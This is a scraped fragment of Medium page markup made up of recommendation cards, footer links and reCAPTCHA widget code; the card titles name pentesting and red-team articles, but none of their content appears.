Stealthy Pentesting Like a Pro" class="bi adn ado adp bx" loading="lazy" src="https://miro.medium.com/v2/resize:fit:679/format:webp/0*3RDWm05NbqoVf-Bd"></div></div></div><div class="adi ac ci cv"></div></div></div></div></div></article></div></div><div class="abw abx aby ql abz aca acb qm acc acd ace acf acg ach aci acj ack acl acm acn aco"><div class="acp acq acr acs act ed m"><article class="ed" data-testid="post-preview"><div class="ed sk m"><div class="bi ed"><div class="ed m"><div class="fr ed acu acv acw acx acy acz ada adb adc add ade adf adg" role="link" data-href="https://medium.com/30-days-of-red-team/30-days-of-red-team-day-14-week-2-integration-lab-f5b1d39d8942" tabindex="0"><div class="adh"><div aria-label="30 Days of Red Team: Day 14 — Week 2 Capstone: Simulating an Advanced Persistent Threat"><div class="adj adk adl adm cc"><img alt="30 Days of Red Team: Day 14 — Week 2 Capstone: Simulating an Advanced Persistent Threat" class="bi adn ado adp bx" loading="lazy" src="https://miro.medium.com/v2/resize:fit:679/format:webp/1*eOObvQTjsbcKb4sKbfPfGA.png"></div></div></div><div class="adi ac ci cv"></div></div></div></div></div></article></div></div><div class="abw abx aby ql abz aca acb qm acc acd ace acf acg ach aci acj ack acl acm acn aco"><div class="acp acq acr acs act ed m"><article class="ed" data-testid="post-preview"><div class="ed sk m"><div class="bi ed"><div class="ed m"><div class="fr ed acu acv acw acx acy acz ada adb adc add ade adf adg" role="link" data-href="https://medium.com/@R3dLevy/evading-windows-security-a-list-of-applocker-bypass-techniques-with-lolbas-2f0568a59ffd" tabindex="0"><div class="adh"><div aria-label="Evading Windows Security: A List of AppLocker Bypass Techniques with LOLBAS"><div class="adj adk adl adm cc"><img alt="Evading Windows Security: A List of AppLocker Bypass Techniques with LOLBAS" class="bi adn ado adp bx" loading="lazy" src="https://miro.medium.com/v2/resize:fit:679/format:webp/1*jGyg42-7Zk1r-TExJ_yBSg.jpeg"></div></div></div><div class="adi ac ci cv"></div></div></div></div></div></article></div></div><div class="abw abx aby ql abz aca acb qm acc acd ace acf acg ach aci acj ack acl acm acn aco"><div class="acp acq acr acs act ed m"><article class="ed" data-testid="post-preview"><div class="ed sk m"><div class="bi ed"><div class="ed m"><div class="fr ed acu acv acw acx acy acz ada adb adc add ade adf adg" role="link" data-href="https://medium.com/@agarwalbinita20/day-1-complex-numbers-linear-algebra-basics-2c910c7e53a8" tabindex="0"><div class="adh"><div aria-label="Day 1: Complex Numbers &amp; Linear Algebra Basics"><div class="adj adk adl adm cc"><img alt="Day 1: Complex Numbers &amp; Linear Algebra Basics" class="bi adn ado adp bx" loading="lazy" src="https://miro.medium.com/v2/resize:fit:679/format:webp/0*g5nYc1IL53Fd5xxN.jpg"></div></div></div><div class="adi ac ci cv"></div></div></div></div></div></article></div></div></div><div class="uh bi vv dr ds aga agb agc"></div><a class="bg b bh ab bl sc ve vf vg mg md vh fc fd fe vi vj vk fh vl vm vn vo vp fi fj fk bn fl fm" rel="noopener follow" href="https://medium.com/?source=post_page---read_next_recirc--d3ac83589e3a---------------------------------------" data-discover="true"><div class="m fm">See more recommendations</div></a></div></div></div><div class="i l k"><div class="uh bi vv vw"></div><div class="ac ci"><div class="cp bi gq gr gs gt"><div class="vx ac ld ju"><div class="vy vz m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://help.medium.com/hc/en-us?source=post_page-----d3ac83589e3a---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Help</p></a></div><div class="vy vz m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://status.medium.com/?source=post_page-----d3ac83589e3a---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Status</p></a></div><div class="vy vz m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/about?autoplay=1&amp;source=post_page-----d3ac83589e3a---------------------------------------" data-discover="true"><p class="bg b ec ab eb">About</p></a></div><div class="vy vz m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----d3ac83589e3a---------------------------------------" data-discover="true"><p class="bg b ec ab eb">Careers</p></a></div><div class="vy vz m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="mailto:pressinquiries@medium.com" rel="noopener follow"><p class="bg b ec ab eb">Press</p></a></div><div class="vy vz m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://blog.medium.com/?source=post_page-----d3ac83589e3a---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Blog</p></a></div><div class="vy vz m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----d3ac83589e3a---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Privacy</p></a></div><div class="vy vz m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page-----d3ac83589e3a---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Rules</p></a></div><div class="vy vz m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----d3ac83589e3a---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Terms</p></a></div><div class="vy m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://speechify.com/medium?source=post_page-----d3ac83589e3a---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Text to speech</p></a></div></div></div></div></div></div></div></div></div></div></div></div>





































<div height="1" width="1" style="position: absolute; top: 0px; left: 0px; border: none; visibility: hidden;" data-original-tag="iframe"></div>
<div><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo"><div title="reCAPTCHA" width="256" height="60" role="presentation" name="a-x5l8qcutk3jh" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" src="https://www.google.com/recaptcha/enterprise/anchor?ar=1&amp;k=6Le-uGgpAAAAAPprRaokM8AKthQ9KNGdoxaGUvVp&amp;co=aHR0cHM6Ly9tZWRpdW0uY29tOjQ0Mw..&amp;hl=en&amp;v=vUgXt_KV952_-5BB2jjloYzl&amp;size=invisible&amp;anchor-ms=20000&amp;execute-ms=30000&amp;cb=ijqwl1meww45" data-original-tag="iframe">

<title>reCAPTCHA</title>

<link rel="stylesheet" type="text/css" href="https://www.gstatic.com/recaptcha/releases/vUgXt_KV952_-5BB2jjloYzl/styles__ltr.css">


<div id="rc-anchor-alert" class="rc-anchor-alert"></div>

<div class="rc-anchor rc-anchor-invisible rc-anchor-light  rc-anchor-invisible-hover"><div id="recaptcha-accessible-status" class="rc-anchor-aria-status" aria-hidden="true">Recaptcha requires verification. </div><div class="rc-anchor-error-msg-container" style="display:none"><span class="rc-anchor-error-msg" aria-hidden="true"></span></div><div class="rc-anchor-normal-footer"><div class="rc-anchor-logo-large" role="presentation"><div class="rc-anchor-logo-img rc-anchor-logo-img-large"></div></div><div class="rc-anchor-pt"><a href="https://www.google.com/intl/en/policies/privacy/" target="_blank">Privacy</a><span aria-hidden="true" role="presentation"> - </span><a href="https://www.google.com/intl/en/policies/terms/" target="_blank">Terms</a></div></div><div class="rc-anchor-invisible-text"><span>protected by <strong>reCAPTCHA</strong></span><div class="rc-anchor-pt"><a href="https://www.google.com/intl/en/policies/privacy/" target="_blank" style="">Privacy</a><span aria-hidden="true" role="presentation"> - </span><a href="https://www.google.com/intl/en/policies/terms/" target="_blank" style="">Terms</a></div></div></div><div style="display: none;" data-original-tag="iframe"></div></div></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response-100000" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><div style="display: none;" data-original-tag="iframe"></div></div></body></html>